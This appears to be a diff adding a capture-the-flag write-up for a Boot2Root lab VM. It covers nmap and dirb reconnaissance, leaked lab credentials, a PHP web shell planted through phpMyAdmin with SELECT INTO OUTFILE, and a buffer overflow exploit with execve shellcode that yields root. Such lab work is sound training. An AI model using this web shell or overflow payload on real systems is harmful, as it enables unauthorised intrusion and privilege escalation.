@@ -1,0 +1,217 @@
+******************************************************************* 
+RECONNAISSANCE :
+******************************************************************* 
+
+We used nmap for scanning the network
+ - nmap 192.168.56.1/24
+
+We saw the ip adress of the Boot2Root Machine is 192.168.56.108
+Then we scanning the machine
+ - nmap -sV 192.168.56.108
+
+ The port 80 is open.
+ http://192.168.56.108 in the browser.
+
+ We had scanning the website to find directory or path with dirb.
+ - dirb https://192.168.56.108 -w /usr/share/dirb/wordlists/common.txt
+
+we found    https://192.168.56.108/forum
+            https://192.168.56.108/webmail
+            https://192.168.56.108/phpmyadmin
+            https://192.168.56.108/templates_c
+
+
+
+********************************************************************
+OSINT/FIRST INTRUSION :
+******************************************************************* 
+
+In the page https://192.168.56.108/forum Problem login , we found:
+    - user      : lmezard
+    - password  : !q\]Ej?*5K5cy*AJ
+
+We tried to log with this in page login and success.
+
+In Users page we found and email admin : laurie@borntosec.net
+
+We tried to connect with this email and the same password in webmail page and success.
+In the mail box, there is a mail for db access.
+The mail contains the intructions to connect in the database with root login.
+DB ACCESS
+    - root / Fg-'kKXBj87E:aJ$
+
+We conneted with this on the phpmyadmin page to access to db.
+
+******************************************************************* 
+INJECT WEB SHELL
+******************************************************************* 
+
+We conneted with this on the phpmyadmin page to access to db.
+We saw the name's database : forum_db
+And we injected the shell.php file to access to shell:
+
+- 
+    SELECT "<html><body><form action='' method='GET'><input       name='shell' type='text' autofocus /></form></body></html> <?php system($_GET['shell']);?>" INTO OUTFILE "/var/www/forum/templates_c/shell.php"
+
+In url : https://192.168.56.108/forum/templates_c/shell.php to access to shell.
+
+With command ls -l /home, with saw a LOOKATME directory.
+We had to use ls -l /home/LOOKATME : cd /home/LOOKATME
+With saw the file password.
+
+cat /home/LOOKATME/password --> lmezard:G!@M6f4Eatau{sF"
+We used this credentials to connect in ftp server.
+
+
+******************************************************************* 
+LMEZARD'S PART
+******************************************************************* 
+
+We used this credentials to connect in ftp server.
+ftp lmezard@192.168.56.108  password: G!@M6f4Eatau{sF"
+
+With ls command we saw 2 files and we downloaded these files.
+    - get README
+    - get fun
+
+We looked the contain of README file and fun file.
+With command "file fun" we saw the fun file is a tar archive.
+So we rename the fun file to fun.tar for unzip this archive.
+    - mv fun fun.tar
+    - tar -xvf fun.tar
+
+It generate a ft_fun directory with a lot files .pcap
+
+With comnmand ls -l in ft_fun directory.
+With saw one file had a different size than other files.
+
+We had open this file on wireshark and we saw the getme() function.
+
+So, we use the strings command to search this function in all files .pcap
+    - grep getme *
+
+After that, we launched "strings *" and we saw that some files executed a return.
+We launched :
+    - grep return *
+
+We see that there is only one capital letter so we strings the file with return "I"
+and the file with char getme1() 
+    - strings 331ZU.pcap :  char getme1() 
+                            //file5
+
+    - strings APM1E.pcap :  return 'I';
+                            //file6
+This is our commun point to know the order of the letter (//file5 | //file6)
+the function isn't finish and is on the next file
+After we strings all of the .pcap file and find the right word to sha256 
+Iheartpwnage
+    -  echo -n "Iheartpwnage" | sha256sum : 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+
+Now we can connect to ssh with laurie's user :
+    - ssh laurie@192.168.56.107
+    password : 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+
+********************************************************************
+LAURIE'S PART
+********************************************************************
+
+We connect to ssh with laurie's user :
+    - ssh laurie@192.168.56.107
+    password : 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+
+There is two file inside : README bomb
+
+    - scp  laurie@192.168.56.107:/home/laurie/README ./READMEBOMB
+    - scp  laurie@192.168.56.107:/home/laurie/bomb ./
+
+With hex ray, we access to the bomb's file code source (source_bombe)
+
+The bomb binaire is a programme who as 6 phases and wait for the good input user to difuse the bomb
+
+the resultat of all the 6 phases is :
+
+    - Public speaking is very easy.
+    - 1 2 6 24 120 720
+    - 1 b 214
+    - 9
+    - opekmq
+    - 4 2 6 3 1 5
+
+The readme file give us information :
+Diffuse this bomb!
+When you have all the password use it as "thor" user with ssh.
+
+HINT:   
+P        |
+ 2       |
+ b       |    
+         |> There is many good reponse to difuse the bomb the  
+o        |  hint give us the one we need to use
+4        |
+
+
+NO SPACE IN THE PASSWORD (password is case sensitive).
+
+In the subject it's say : 
+For the part related to a (bin) bomb: If the password found is
+123456. The password to use is 123546.
+
+this is for the last password (phase 6) we need to inverse :
+4 2 6 3 1 5 ---> 4 2 6 1 3 5
+
+Now we can create the password : 
+ - Publicspeakingisveryeasy.126241207201b2149opekmq426135
+
+ And we can connect to thor's user with ssh
+
+********************************************************************
+THOR'S PART
+********************************************************************
+
+We connect to thor's user with ssh
+    - ssh thor@192.168.56.107
+    password : Publicspeakingisveryeasy.126241207201b2149opekmq426135
+
+Inside there is two files (README and turtle)
+The readme print : Finish this challenge and use the result as password for 'zaz' user.
+
+And the turtle's file is a list of instructions.
+We have create a script that can read and draw the instructions file (script_turtle.py)
+    - python3 script_turtle.py
+
+This draw the letter S L A S H.
+
+At the end of the turtle's file, it's say : Can you digest the message ?
+The digest is MD5 hash.
+SLASH to md5 is 646da671ca01bb5d84dbb5fb2238dc8e
+
+We can connect to zaz's user with ssh
+
+********************************************************************
+ZAZ'S PART
+********************************************************************
+
+We connect to zaz's user with ssh
+    - ssh zaz@192.168.56.107
+    password : 646da671ca01bb5d84dbb5fb2238dc8e
+
+
+Inside we found a binaire name exploit_me (source_exploime) who got the root user
+the binaire is vulnerable by a buffer overflow.
+
+with some test we found the offset : buffer[128] + 12 (offset) + 4 bytes (EIP)
+
+We are going to inject or payload in the env
+    - export SHELLCODE=$(python -c 'print("\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
+
+Now we need to get the adress of the SHELLCODE variable :
+    - gdb exploit_me
+    - b main
+    - run
+    - call (void*)getenv("SHELLCODE") : $1 = (void *) 0xbffff8af
+    
+Finaly we can put overflow the exploit_me binaire
+    - ./exploit_me `python -c 'print("A" * 140 + "\xff\xf8\xff\xbf")'`
+    - whoami : root
+
+
